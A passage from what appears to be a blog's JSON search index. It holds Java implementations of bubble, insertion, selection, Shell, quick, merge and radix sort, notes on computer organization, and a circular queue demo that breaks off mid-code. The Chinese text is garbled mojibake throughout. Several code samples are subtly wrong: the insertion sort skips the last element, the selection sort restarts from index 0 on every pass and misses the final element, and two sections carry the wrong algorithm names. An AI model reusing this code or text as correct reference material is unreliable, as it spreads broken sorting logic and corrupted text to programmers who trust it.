algorithms","slug":"7ç§æ’åºç®—æ³•","date":"2020-05-17T05:42:21.000Z","updated":"2021-04-11T17:11:28.070Z","comments":true,"path":"7ç§æ’åºç®—æ³•/","link":"","permalink":"https://blog.kayleh.top/7%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/","excerpt":"7ç§æ’åºç®—æ³•å†’æ³¡æ’åº","text":"7ç§æ’åºç®—æ³•å†’æ³¡æ’åº å†’æ³¡æ’åºï¼ˆBubbleSorting)çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡å¯¹å¾…æ’åºåºåˆ—ä»å‰å‘åï¼ˆä»ä¸‹æ ‡è¾ƒå°çš„å…ƒç´ å¼€å§‹ï¼‰,ä¾æ¬¡æ¯”è¾ƒç›¸é‚»å…ƒç´ çš„å€¼ï¼Œè‹¥å‘ç°é€†åºåˆ™äº¤æ¢ï¼Œä½¿å€¼è¾ƒå¤§çš„å…ƒç´ é€æ¸ä»å‰ç§»å‘åéƒ¨ã€‚ img ä»£ç å®ç° // å°†å‰é¢çš„å†’æ³¡æ’åºç®—æ³•ï¼Œå°è£…æˆä¸€ä¸ªæ–¹æ³• public static void bubbleSort(int[] arr) { // å†’æ³¡æ’åº çš„æ—¶é—´å¤æ‚åº¦ O(n^2), è‡ªå·±å†™å‡º int temp = 0; // ä¸´æ—¶å˜é‡ boolean flag = false; // æ ‡è¯†å˜é‡ï¼Œè¡¨ç¤ºæ˜¯å¦è¿›è¡Œè¿‡äº¤æ¢ for (int i = 0; i &lt; arr.length - 1; i++) { for (int j = 0; j &lt; arr.length - 1 - i; j++) { // å¦‚æœå‰é¢çš„æ•°æ¯”åé¢çš„æ•°å¤§ï¼Œåˆ™äº¤æ¢ if (arr[j] &gt; arr[j + 1]) { flag = true; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } //System.out.println(&quot;ç¬¬&quot; + (i + 1) + &quot;è¶Ÿæ’åºåçš„æ•°ç»„&quot;); //System.out.println(Arrays.toString(arr)); if (!flag) { // åœ¨ä¸€è¶Ÿæ’åºä¸­ï¼Œä¸€æ¬¡äº¤æ¢éƒ½æ²¡æœ‰å‘ç”Ÿè¿‡ break; } else { flag = false; // é‡ç½®flag!!!, è¿›è¡Œä¸‹æ¬¡åˆ¤æ–­ } } æ’å…¥æ’åº æ’å…¥æ’åºï¼ˆinsertSorting) åŸºæœ¬æ€æƒ³æ˜¯ï¼šæŠŠnä¸ªå¾…æ’åºçš„å…ƒç´ çœ‹æˆä¸ºä¸€ä¸ªæœ‰åºè¡¨å’Œä¸€ä¸ªæ— åºè¡¨ï¼Œå¼€å§‹æ—¶æœ‰åºè¡¨ä¸­åªåŒ…å«ä¸€ä¸ªå…ƒç´ ï¼Œæ— åºè¡¨ä¸­åŒ…å«æœ‰n-1ä¸ªå…ƒç´ ï¼Œæ’åºè¿‡ç¨‹ä¸­æ¯æ¬¡ä»æ— åºè¡¨ä¸­å–å‡ºç¬¬ä¸€ä¸ªå…ƒç´ ï¼ŒæŠŠå®ƒçš„æ’åºç ä¾æ¬¡ä¸æœ‰åºè¡¨å…ƒç´ çš„æ’åºç è¿›è¡Œæ¯”è¾ƒï¼Œå°†å®ƒæ’å…¥åˆ°æœ‰åºè¡¨ä¸­çš„é€‚å½“ä½ç½®ï¼Œä½¿ä¹‹æˆä¸ºæ–°çš„æœ‰åºè¡¨ã€‚ ä»£ç å®ç° public static void insertSort(int attr[]) { //ä»ç¬¬2ä¸ªæ•°å¼€å§‹éå† ã€1ã€‘ for (int i = 1; i &lt; attr.length - 1; i++) { // ç­‰å¾…æ’å…¥çš„æ•°çš„å‰ä¸€ä¸ªæ•°ä¸‹æ ‡ int insertIndex = i - 1; //ç­‰å¾…æ’å…¥çš„æ•°çš„å€¼ int insertValue = attr[i]; // insertIndexä¸èƒ½è¶Šç•Œ // insertValueå¾…æ’å…¥åˆ°å‰é¢æœ‰åºåˆ—è¡¨çš„æ•° // insertValueå¾…æ’å…¥çš„æ•° å°äº å‰1ä¸ªæ•° while (insertIndex &gt;= 0 &amp;&amp; attr[insertIndex] &gt; insertValue) { // äº¤æ¢ // attr[insertIndex]åç§» attr[insertIndex + 1] = attr[insertIndex]; insertIndex--; } //å½“é€€å‡ºwhileå¾ªç¯æ—¶ï¼Œè¯´æ˜æ’å…¥çš„ä½ç½®æ‰¾åˆ°, insertIndex + 1 if (insertIndex + 1 != i) { attr[insertIndex + 1] = insertValue; } } } é€‰æ‹©æ’åº é€‰æ‹©æ’åºï¼ˆselectSorting)çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼š ç¬¬ä¸€æ¬¡ä»arr[0]~arr[n-1]ä¸­é€‰å–æœ€å°å€¼ï¼Œä¸arr[0]äº¤æ¢ï¼Œç¬¬äºŒæ¬¡ä»arr[1]~arr[n-1]ä¸­é€‰å–æœ€å°å€¼ï¼Œä¸arr[1]äº¤æ¢ï¼Œç¬¬ä¸‰æ¬¡ä»arr[2]~arr[n-1]ä¸­é€‰å–æœ€å°å€¼ï¼Œä¸arr[2]äº¤æ¢ï¼Œâ€¦ï¼Œç¬¬iæ¬¡ä»arr[i-1]~arr[n-1]ä¸­é€‰å–æœ€å°å€¼ï¼Œä¸arr[i-1]äº¤æ¢ï¼Œâ€¦,ç¬¬n-1æ¬¡ä»arr[n-2]~arr[n-1]ä¸­é€‰å–æœ€å°å€¼ï¼Œä¸arr[n-2]äº¤æ¢ï¼Œæ€»å…±é€šè¿‡n-1æ¬¡ï¼Œå¾—åˆ°ä¸€ä¸ªæŒ‰æ’åºç ä»å°åˆ°å¤§æ’åˆ—çš„æœ‰åºåºåˆ—ã€‚ img ä»£ç å®ç° public class selectSort { public static void selectSort(int attr[]) { for (int i = 0; i &lt; attr.length - 1; i++) { //å‡è®¾ç¬¬ä¸€ä¸ªæ•°å°±æ˜¯æœ€å°å€¼ int minindex = 0; int min = attr[0]; //ä»1å¼€å§‹éå† for (int j = 1; j &lt; attr.length - 1; j++) { //å¦‚æœç¬¬0ä¸ªæ•°ï¼ˆæœ€å°å€¼ï¼‰æ¯”ç¬¬1ä¸ªæ•° å¤§ //è¯´æ˜å‡è®¾çš„ç¬¬0ä¸ªå¹¶ä¸æ˜¯æœ€å°å€¼ if (min &gt; attr[j]) { min = attr[j];//é‡ç½®æœ€å°å€¼ minindex = j;//é‡ç½®æœ€å°å€¼ç´¢å¼• } } //å¦‚æœæœ€å°å€¼çš„ç´¢å¼•ä¸æ˜¯0ï¼Œå°±å‘ç”Ÿäº¤æ¢ if (minindex != i) { //æŠŠç¬¬0ä¸ªæ•°ï¼ˆä¸æ˜¯æœ€å°å€¼ï¼‰èµ‹å€¼åˆ° ç¬¬1ä¸ªæ•°ï¼ˆè¾ƒå°å€¼ï¼‰çš„ä½ç½® attr[minindex] = attr[i]; //æŠŠè¾ƒå°å€¼èµ‹å€¼ç»™ç¬¬1ä¸ªæ•° attr[i] = min; } } } å¸Œå°”æ’åº å†’æ³¡æ’åºï¼ˆBubbleSorting)çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼š æŠŠè®°å½•æŒ‰ä¸‹æ ‡çš„ä¸€å®šå¢é‡åˆ†ç»„ï¼Œå¯¹æ¯ç»„ä½¿ç”¨ç›´æ¥æ’å…¥æ’åºç®—æ³•æ’åºï¼›éšç€å¢é‡é€æ¸å‡å°‘ï¼Œæ¯ç»„åŒ…å«çš„å…³é”®è¯è¶Šæ¥è¶Šå¤šï¼Œå½“å¢é‡å‡è‡³1æ—¶ï¼Œæ•´ä¸ªæ–‡ä»¶æ°è¢«åˆ†æˆä¸€ç»„ï¼Œç®—æ³•ä¾¿ç»ˆæ­¢ img ä»£ç å®ç° //ç§»åŠ¨æ³• //å¢é‡gapï¼Œå¹¶é€æ­¥çš„ç¼©å°å¢é‡ for (int gap = attr.length/2;gap&gt;0;gap/=2){ //ä»ç¬¬gapä¸ªå…ƒç´ å¼€å§‹ï¼Œé€ä¸ªå¯¹å…¶æ‰€åœ¨çš„ç»„è¿›è¡Œç›´æ¥æ’å…¥æ’åº for (int i =gap;i&lt;attr.length;i++){ // å½“å‰ä½ç½® int j = i; //å½“å‰ä½ç½®çš„å€¼èµ‹å€¼ç»™temp int temp = attr[j]; // å¦‚æœ å½“å‰ç»„çš„gapä¸ªæ­¥é•¿å‰é¢çš„æ•°å¤§äºå½“å‰ä½ç½®çš„æ•° if(attr[j]&lt;attr[j-gap]){ while (j-gap &gt;= 0 &amp;&amp; temp &lt; attr[j-gap]){ //ç§»åŠ¨ attr[j] = attr[j-gap]; j -= gap; } //å½“é€€å‡ºwhileå¾ªç¯åï¼Œå°±ç»™tempæ‰¾åˆ°æ’å…¥çš„ä½ç½® attr[j] = temp; } } } å¿«é€Ÿæ’åº å¿«é€Ÿæ’åºï¼ˆQuickSorting) æ˜¯å¯¹å†’æ³¡æ’åºçš„ä¸€ç§æ”¹è¿›ã€‚åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡ä¸€è¶Ÿæ’åºå°†è¦æ’åºçš„æ•°æ®åˆ†å‰²æˆç‹¬ç«‹çš„ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†çš„æ‰€æœ‰æ•°æ®éƒ½æ¯”å¦å¤–ä¸€éƒ¨åˆ†çš„æ‰€æœ‰æ•°æ®éƒ½è¦å°ï¼Œç„¶åå†æŒ‰æ­¤æ–¹æ³•å¯¹è¿™ä¸¤éƒ¨åˆ†æ•°æ®åˆ†åˆ«è¿›è¡Œå¿«é€Ÿæ’åºï¼Œæ•´ä¸ªæ’åºè¿‡ç¨‹å¯ä»¥é€’å½’è¿›è¡Œï¼Œä»¥æ­¤è¾¾åˆ°æ•´ä¸ªæ•°æ®å˜æˆæœ‰åºåºåˆ— img ä»£ç å®ç° public static void quickSort(int[] arr,int left, int right) { int l = left; //å·¦ä¸‹æ ‡ int r = right; //å³ä¸‹æ ‡ //pivot ä¸­è½´å€¼ int pivot = arr[(left + right) / 2]; int temp = 0; //ä¸´æ—¶å˜é‡ï¼Œä½œä¸ºäº¤æ¢æ—¶ä½¿ç”¨ //whileå¾ªç¯çš„ç›®çš„æ˜¯è®©æ¯”pivot å€¼å°æ”¾åˆ°å·¦è¾¹ //æ¯”pivot å€¼å¤§æ”¾åˆ°å³è¾¹ while( l &lt; r) { //åœ¨pivotçš„å·¦è¾¹ä¸€ç›´æ‰¾,æ‰¾åˆ°å¤§äºç­‰äºpivotå€¼,æ‰é€€å‡º while( arr[l] &lt; pivot) { l += 1; } //åœ¨pivotçš„å³è¾¹ä¸€ç›´æ‰¾,æ‰¾åˆ°å°äºç­‰äºpivotå€¼,æ‰é€€å‡º while(arr[r] &gt; pivot) { r -= 1; } //å¦‚æœl &gt;= rè¯´æ˜pivot çš„å·¦å³ä¸¤çš„å€¼ï¼Œå·²ç»æŒ‰ç…§å·¦è¾¹å…¨éƒ¨æ˜¯ //å°äºç­‰äºpivotå€¼ï¼Œå³è¾¹å…¨éƒ¨æ˜¯å¤§äºç­‰äºpivotå€¼ if( l &gt;= r) { break; } //äº¤æ¢ temp = arr[l]; arr[l] = arr[r]; arr[r] = temp; //å¦‚æœäº¤æ¢å®Œåï¼Œå‘ç°è¿™ä¸ªarr[l] == pivotå€¼ ç›¸ç­‰ r--ï¼Œ å‰ç§» if(arr[l] == pivot) { r -= 1; } //å¦‚æœäº¤æ¢å®Œåï¼Œå‘ç°è¿™ä¸ªarr[r] == pivotå€¼ ç›¸ç­‰ l++ï¼Œ åç§» if(arr[r] == pivot) { l += 1; } } // å¦‚æœ l == r, å¿…é¡»l++, r--, å¦åˆ™ä¸ºå‡ºç°æ ˆæº¢å‡º if (l == r) { l += 1; r -= 1; } //å‘å·¦é€’å½’ if(left &lt; r) { quickSort(arr, left, r); } //å‘å³é€’å½’ if(right &gt; l) { quickSort(arr, l, right); } } å½’å¹¶æ’åº å½’å¹¶æ’åºï¼ˆmergeSorting)çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼š æ˜¯åˆ©ç”¨å½’å¹¶çš„æ€æƒ³å®ç°çš„æ’åºæ–¹æ³•ï¼Œè¯¥ç®—æ³•é‡‡ç”¨ç»å…¸çš„åˆ†æ²»ï¼ˆdivide-and-conquerï¼‰ç­–ç•¥ï¼ˆåˆ†æ²»æ³•å°†é—®é¢˜åˆ†(divide)æˆä¸€äº›å°çš„é—®é¢˜ç„¶åé€’å½’æ±‚è§£ï¼Œè€Œæ²»(conquer)çš„é˜¶æ®µåˆ™å°†åˆ†çš„é˜¶æ®µå¾—åˆ°çš„å„ç­”æ¡ˆâ€ä¿®è¡¥â€åœ¨ä¸€èµ·ï¼Œå³åˆ†è€Œæ²»ä¹‹)ã€‚ img ä»£ç å®ç° //åˆ†+åˆæ–¹æ³• public static void mergeSort(int[] arr, int left, int right, int[] temp) { if(left &lt; right) { int mid = (left + right) / 2; //ä¸­é—´ç´¢å¼• //å‘å·¦é€’å½’è¿›è¡Œåˆ†è§£ mergeSort(arr, left, mid, temp); //å‘å³é€’å½’è¿›è¡Œåˆ†è§£ mergeSort(arr, mid + 1, right, temp); //åˆå¹¶ merge(arr, left, mid, right, temp); } } //åˆå¹¶çš„æ–¹æ³• /** * * @param arr æ’åºçš„åŸå§‹æ•°ç»„ * @param left å·¦è¾¹æœ‰åºåºåˆ—çš„åˆå§‹ç´¢å¼• * @param mid ä¸­é—´ç´¢å¼• * @param right å³è¾¹ç´¢å¼• * @param temp åšä¸­è½¬çš„æ•°ç»„ */ public static void merge(int[] arr, int left, int mid, int right, int[] temp) { int i = left; // åˆå§‹åŒ–i, å·¦è¾¹æœ‰åºåºåˆ—çš„åˆå§‹ç´¢å¼• int j = mid + 1; //åˆå§‹åŒ–j, å³è¾¹æœ‰åºåºåˆ—çš„åˆå§‹ç´¢å¼• int t = 0; // æŒ‡å‘tempæ•°ç»„çš„å½“å‰ç´¢å¼• //(ä¸€) //å…ˆæŠŠå·¦å³ä¸¤è¾¹(æœ‰åº)çš„æ•°æ®æŒ‰ç…§è§„åˆ™å¡«å……åˆ°tempæ•°ç»„ //ç›´åˆ°å·¦å³ä¸¤è¾¹çš„æœ‰åºåºåˆ—ï¼Œæœ‰ä¸€è¾¹å¤„ç†å®Œæ¯•ä¸ºæ­¢ while (i &lt;= mid &amp;&amp; j &lt;= right) {//ç»§ç»­ //å¦‚æœå·¦è¾¹çš„æœ‰åºåºåˆ—çš„å½“å‰å…ƒç´ ï¼Œå°äºç­‰äºå³è¾¹æœ‰åºåºåˆ—çš„å½“å‰å…ƒç´  //å³å°†å·¦è¾¹çš„å½“å‰å…ƒç´ ï¼Œå¡«å……åˆ° tempæ•°ç»„ //ç„¶å t++, i++ if(arr[i] &lt;= arr[j]) { temp[t] = arr[i]; t += 1; i += 1; } else { //åä¹‹,å°†å³è¾¹æœ‰åºåºåˆ—çš„å½“å‰å…ƒç´ ï¼Œå¡«å……åˆ°tempæ•°ç»„ temp[t] = arr[j]; t += 1; j += 1; } } //(äºŒ) //æŠŠæœ‰å‰©ä½™æ•°æ®çš„ä¸€è¾¹çš„æ•°æ®ä¾æ¬¡å…¨éƒ¨å¡«å……åˆ°temp while( i &lt;= mid) { //å·¦è¾¹çš„æœ‰åºåºåˆ—è¿˜æœ‰å‰©ä½™çš„å…ƒç´ ï¼Œå°±å…¨éƒ¨å¡«å……åˆ°temp temp[t] = arr[i]; t += 1; i += 1; } while( j &lt;= right) { //å³è¾¹çš„æœ‰åºåºåˆ—è¿˜æœ‰å‰©ä½™çš„å…ƒç´ ï¼Œå°±å…¨éƒ¨å¡«å……åˆ°temp temp[t] = arr[j]; t += 1; j += 1; } //(ä¸‰) //å°†tempæ•°ç»„çš„å…ƒç´ æ‹·è´åˆ°arr //æ³¨æ„ï¼Œå¹¶ä¸æ˜¯æ¯æ¬¡éƒ½æ‹·è´æ‰€æœ‰ t = 0; int tempLeft = left; // //ç¬¬ä¸€æ¬¡åˆå¹¶ tempLeft = 0 , right = 1 // tempLeft = 2 right = 3 // tL=0 ri=3 //æœ€åä¸€æ¬¡ tempLeft = 0 right = 7 while(tempLeft &lt;= right) { arr[tempLeft] = temp[t]; t += 1; tempLeft += 1; } } åŸºæ•°æ’åº åŸºæ•°æ’åºï¼ˆmergeSorting)çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼š å°†æ‰€æœ‰å¾…æ¯”è¾ƒæ•°å€¼ç»Ÿä¸€ä¸ºåŒæ ·çš„æ•°ä½é•¿åº¦ï¼Œæ•°ä½è¾ƒçŸ­çš„æ•°å‰é¢è¡¥é›¶ã€‚ç„¶åï¼Œä»æœ€ä½ä½å¼€å§‹ï¼Œä¾æ¬¡è¿›è¡Œä¸€æ¬¡æ’åºã€‚è¿™æ ·ä»æœ€ä½ä½æ’åºä¸€ç›´åˆ°æœ€é«˜ä½æ’åºå®Œæˆä»¥å, æ•°åˆ—å°±å˜æˆä¸€ä¸ªæœ‰åºåºåˆ—ã€‚ img ä»£ç å®ç° //åŸºæ•°æ’åºæ–¹æ³• public static void radixSort(int[] arr) { //æ ¹æ®å‰é¢çš„æ¨å¯¼è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„åŸºæ•°æ’åºä»£ç  //1. å¾—åˆ°æ•°ç»„ä¸­æœ€å¤§çš„æ•°çš„ä½æ•° int max = arr[0]; //å‡è®¾ç¬¬ä¸€æ•°å°±æ˜¯æœ€å¤§æ•° for(int i = 1; i &lt; arr.length; i++) { if (arr[i] &gt; max) { max = arr[i]; } } //å¾—åˆ°æœ€å¤§æ•°æ˜¯å‡ ä½æ•° int maxLength = (max + &quot;&quot;).length(); //å®šä¹‰ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œè¡¨ç¤º10ä¸ªæ¡¶, æ¯ä¸ªæ¡¶å°±æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ //è¯´æ˜ //1. äºŒç»´æ•°ç»„åŒ…å«10ä¸ªä¸€ç»´æ•°ç»„ //2. ä¸ºäº†é˜²æ­¢åœ¨æ”¾å…¥æ•°çš„æ—¶å€™ï¼Œæ•°æ®æº¢å‡ºï¼Œåˆ™æ¯ä¸ªä¸€ç»´æ•°ç»„(æ¡¶)ï¼Œå¤§å°å®šä¸ºarr.length //3. åæ˜ç¡®ï¼ŒåŸºæ•°æ’åºæ˜¯ä½¿ç”¨ç©ºé—´æ¢æ—¶é—´çš„ç»å…¸ç®—æ³• int[][] bucket = new int[10][arr.length]; //ä¸ºäº†è®°å½•æ¯ä¸ªæ¡¶ä¸­ï¼Œå®é™…å­˜æ”¾äº†å¤šå°‘ä¸ªæ•°æ®,æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªä¸€ç»´æ•°ç»„æ¥è®°å½•å„ä¸ªæ¡¶çš„æ¯æ¬¡æ”¾å…¥çš„æ•°æ®ä¸ªæ•° //å¯ä»¥è¿™é‡Œç†è§£ //æ¯”å¦‚ï¼šbucketElementCounts[0] , è®°å½•çš„å°±æ˜¯ bucket[0] æ¡¶çš„æ”¾å…¥æ•°æ®ä¸ªæ•° int[] bucketElementCounts = new int[10]; //è¿™é‡Œä½¿ç”¨å¾ªç¯å°†ä»£ç å¤„ç† for(int i = 0 , n = 1; i &lt; maxLength; i++, n *= 10) { //(é’ˆå¯¹æ¯ä¸ªå…ƒç´ çš„å¯¹åº”ä½è¿›è¡Œæ’åºå¤„ç†)ï¼Œ ç¬¬ä¸€æ¬¡æ˜¯ä¸ªä½ï¼Œç¬¬äºŒæ¬¡æ˜¯åä½ï¼Œç¬¬ä¸‰æ¬¡æ˜¯ç™¾ä½.. for(int j = 0; j &lt; arr.length; j++) { //å–å‡ºæ¯ä¸ªå…ƒç´ çš„å¯¹åº”ä½çš„å€¼ int digitOfElement = arr[j] / n % 10; //æ”¾å…¥åˆ°å¯¹åº”çš„æ¡¶ä¸­ bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[j]; bucketElementCounts[digitOfElement]++; } //æŒ‰ç…§è¿™ä¸ªæ¡¶çš„é¡ºåº(ä¸€ç»´æ•°ç»„çš„ä¸‹æ ‡ä¾æ¬¡å–å‡ºæ•°æ®ï¼Œæ”¾å…¥åŸæ¥æ•°ç»„) int index = 0; //éå†æ¯ä¸€æ¡¶ï¼Œå¹¶å°†æ¡¶ä¸­æ˜¯æ•°æ®ï¼Œæ”¾å…¥åˆ°åŸæ•°ç»„ for(int k = 0; k &lt; bucketElementCounts.length; k++) { //å¦‚æœæ¡¶ä¸­ï¼Œæœ‰æ•°æ®ï¼Œæˆ‘ä»¬æ‰æ”¾å…¥åˆ°åŸæ•°ç»„ if(bucketElementCounts[k] != 0) { //å¾ªç¯è¯¥æ¡¶å³ç¬¬kä¸ªæ¡¶(å³ç¬¬kä¸ªä¸€ç»´æ•°ç»„), æ”¾å…¥ for(int l = 0; l &lt; bucketElementCounts[k]; l++) { //å–å‡ºå…ƒç´ æ”¾å…¥åˆ°arr arr[index++] = bucket[k][l]; } } //ç¬¬i+1è½®å¤„ç†åï¼Œéœ€è¦å°†æ¯ä¸ª bucketElementCounts[k] = 0 ï¼ï¼ï¼ï¼ bucketElementCounts[k] = 0; } } } å„ä¸ªç®—æ³•çš„å¤æ‚åº¦ img","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"è®¡ç®—æœºç»„æˆåŸç†","slug":"è®¡ç®—æœºç»„æˆåŸç†","date":"2020-05-14T06:04:21.000Z","updated":"2021-04-11T17:11:29.021Z","comments":true,"path":"è®¡ç®—æœºç»„æˆåŸç†/","link":"","permalink":"https://blog.kayleh.top/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","excerpt":"è®¡ç®—æœºç»„æˆåŸç†1.ç¬¬ä¸€å°ç”µå­è®¡ç®—æœºä½•æ—¶ä½•åœ°è¯ç”Ÿï¼Ÿè‹±æ–‡å…¨ç§°ï¼Ÿ1946å¹´2æœˆ14æ—¥ ç¾å›½å®¾å¤•æ³•å°¼äºšå¤§å­¦","text":"è®¡ç®—æœºç»„æˆåŸç†1.ç¬¬ä¸€å°ç”µå­è®¡ç®—æœºä½•æ—¶ä½•åœ°è¯ç”Ÿï¼Ÿè‹±æ–‡å…¨ç§°ï¼Ÿ1946å¹´2æœˆ14æ—¥ ç¾å›½å®¾å¤•æ³•å°¼äºšå¤§å­¦ ENIACï¼šç”µå­æ•°å­—ç§¯åˆ†è®¡ç®—æœº Electronic(ç”µå­çš„) Numerical(æ•°å­—çš„) Integrator(ç»¼åˆè€…) And Calculator(è®¡ç®—æœº) 2.å†¯Â·è¯ºä¾æ›¼å‹è®¡ç®—æœºç»„æˆ,æ€æƒ³?è®¡ç®—æœºç»„æˆ: è¿ç®—å™¨ã€æ§åˆ¶å™¨ã€å­˜å‚¨å™¨ã€è¾“å…¥è®¾å¤‡ã€è¾“å‡ºè®¾å¤‡ã€‚ æ€æƒ³ï¼š é‡‡ç”¨äºŒè¿›åˆ¶çš„å½¢å¼è¡¨ç¤ºæ•°æ®å’ŒæŒ‡ä»¤ï¼Œå°†æ•°æ®å’ŒæŒ‡ä»¤äº‹å…ˆä¿å­˜åœ¨å­˜å‚¨å™¨ä¸­ï¼ŒæŒ‰ç…§é¡ºåºæ‰§è¡Œç¨‹åºæ¥æ§åˆ¶è®¡ç®—æœºå·¥ä½œè¿è¡Œã€‚ 3.ç°ä»£è®¡ç®—æœºç¡¬ä»¶ç³»ç»Ÿä¸å†¯Â·è¯ºä¾æ›¼å‹è®¡ç®—æœºç»„æˆæœ‰ä»€ä¹ˆä¸åŒï¼Ÿç›¸åŒç‚¹ï¼š ç°ä»£è®¡ç®—æœºä»æ˜¯å†¯Â·è¯ºä¾æ›¼ä½“ç³»ç»“æ„ã€‚ ä¸åŒç‚¹ï¼šç»„æˆå½¢å¼æ”¹å˜å¾ˆå¤§ (1)é€»è¾‘å…ƒä»¶ç»„è£…æˆç”µè·¯é«˜åº¦é›†æˆ,æŠŠè¿ç®—ã€æ§åˆ¶å™¨é›†æˆåˆ°ä¸€å—CPUèŠ¯ç‰‡ä¸Šã€‚ (2)å­˜å‚¨å™¨åˆ†ä¸ºä¸‰çº§ï¼šé«˜é€Ÿç¼“å†²å­˜å‚¨å™¨Cacheï¼Œä¸»å­˜å‚¨å™¨(å†…å­˜),å¤–éƒ¨å­˜å‚¨å™¨; å…¶ä¸­Cacheç°åœ¨éƒ½é›†æˆåœ¨CPUé‡Œ,ä¸»å­˜ç”±å†…å­˜æ¡å®ç°,å¤–éƒ¨å­˜å‚¨å™¨ä¸»è¦æœ‰æœºæ¢°ç¡¬ç›˜,å›ºæ€ç¡¬ç›˜ç­‰; (3)è¾“å‡ºä¸è¾“å…¥è®¾å¤‡ä¸»è¦æœ‰æ˜¾ç¤ºå±,é¼ æ ‡,é”®ç›˜. æ˜¾ç¤ºå™¨æœ‰ä¸“é—¨æ˜¾ç¤ºæ¥å£(é›†æˆæˆ–ç‹¬ç«‹æ˜¾å¡)è¿æ¥CPUæˆ–ä¸»å­˜,é”®ç›˜å’Œé¼ æ ‡ä¹Ÿé€šè¿‡é›†æˆæ¥å£CPU. æ­¤å¤–è¿˜é…ç½®é›†æˆç½‘å¡å’Œå£°å¡. (4)USBå¤šç§è¿æ¥æ¥å£å®ç°ç½‘ç»œä¸å¤šåª’ä½“è¿æ¥.æ•´ä¸ªç³»ç»Ÿé‡‡ç”¨å¤šçº§æ€»çº¿ç»“æ„ç»„æˆ. 4.CPUçš„æ€§èƒ½å…¬å¼,æ€§èƒ½æŒ‡æ ‡,å¦‚ä½•è¯„ä»·?","categories":[],"tags":[{"name":"computer","slug":"computer","permalink":"https://blog.kayleh.top/tags/computer/"}]},{"title":"queue","slug":"é˜Ÿåˆ—","date":"2020-05-14T00:52:39.000Z","updated":"2021-04-11T17:11:29.090Z","comments":true,"path":"é˜Ÿåˆ—/","link":"","permalink":"https://blog.kayleh.top/%E9%98%9F%E5%88%97/","excerpt":"é˜Ÿåˆ—","text":"é˜Ÿåˆ— å®šä¹‰ï¼šéµå¾ªå…ˆè¿›å…ˆå‡ºï¼Œå°±æ˜¯é˜Ÿåˆ—ã€‚å¯ä»¥æƒ³è±¡ä¸ºæ’é˜Ÿï¼Œå…ˆæ’é˜Ÿçš„äººå…ˆåŠç†ä¸šåŠ¡ã€‚ é˜Ÿåˆ—æ˜¯ä¸€ä¸ªæœ‰åºåˆ—è¡¨ã€‚ éµå¾ªå…ˆè¿›å…ˆå‡ºçš„åŸåˆ™ã€‚å³ï¼šå…ˆå­˜å…¥çš„æ•°æ®å…ˆå–å‡ºï¼Œåå­˜å…¥çš„æ•°æ®åå–å‡ºã€‚ ç¤ºæ„ï¼šæ•°ç»„æ¨¡æ‹Ÿï¼š é˜Ÿåˆ—æœ¬èº«æ˜¯æœ‰åºåˆ—è¡¨ï¼Œå¦‚ä½¿ç”¨æ•°ç»„çš„ç»“æ„æ¥å­˜å‚¨é˜Ÿåˆ—çš„æ•°æ®ï¼Œå› ä¸ºé˜Ÿåˆ—çš„è¾“å‡ºã€è¾“å…¥æ˜¯åˆ†åˆ«ä»å‰åç«¯æ¥å¤„ç†ï¼Œå› æ­¤éœ€è¦ä¸¤ä¸ªå˜é‡frontåŠrearåˆ†åˆ«è®°å½•é˜Ÿåˆ—å‰åç«¯çš„ä¸‹æ ‡ï¼Œfrontä¼šéšç€æ•°æ®è¾“å‡ºè€Œæ”¹å˜ï¼Œè€Œrearåˆ™æ˜¯éšç€æ•°æ®è¾“å…¥è€Œæ”¹å˜ï¼Œå…¶ä¸­ maxSizeæ˜¯è¯¥é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡ã€‚å¦‚å›¾æ‰€ç¤ºã€‚ ç”¨ç¨€ç–æ•°ç»„ä»£æ›¿äºŒç»´æ•°ç»„ï¼Œç¬¬0è¡Œè¡¨ç¤ºç¨€ç–æ•°ç»„çš„æ€»è¡Œï¼Œæ€»åˆ—å’Œæ‰€éœ€å†…å®¹çš„ä¸ªæ•°ã€‚ ä»£ç å®ç° package queue; import java.util.Scanner; public class CircleArrayQueueDemo { public static void main(String[] args) { //æµ‹è¯• System.out.println(&quot;æµ‹è¯•æ•°ç»„æ¨¡æ‹Ÿç¯å½¢é˜Ÿåˆ—çš„æ¡ˆä¾‹~~~&quot;); // åˆ›å»ºä¸€ä¸ªç¯å½¢é˜Ÿåˆ— CircleArray queue = new CircleArray(4); //è¯´æ˜è®¾ç½®4, å…¶é˜Ÿåˆ—çš„æœ‰æ•ˆæ•°æ®æœ€å¤§æ˜¯3 char key = &#39; &#39;; // æ¥æ”¶ç”¨æˆ·è¾“å…¥ Scanner scanner = new Scanner(System.in);// boolean loop = true; // è¾“å‡ºä¸€ä¸ªèœå• while (loop) { System.out.println(&quot;s(show): æ˜¾ç¤ºé˜Ÿåˆ—&quot;); System.out.println(&quot;e(exit): é€€å‡ºç¨‹åº&quot;); System.out.println(&quot;a(add): æ·»åŠ æ•°æ®åˆ°é˜Ÿåˆ—&quot;); System.out.println(&quot;g(get): ä»é˜Ÿåˆ—å–å‡ºæ•°æ®&quot;); System.out.println(&quot;h(head): æŸ¥çœ‹é˜Ÿåˆ—å¤´çš„æ•°æ®&quot;); key = scanner.next().charAt(0);// æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ switch (key) { case &#39;s&#39;: queue.showQueue(); break; case &#39;a&#39;: System.out.println(&quot;è¾“å‡ºä¸€ä¸ªæ•°&quot;); int value = scanner.nextInt(); queue.addQueue(value); break; case &#39;g&#39;: // 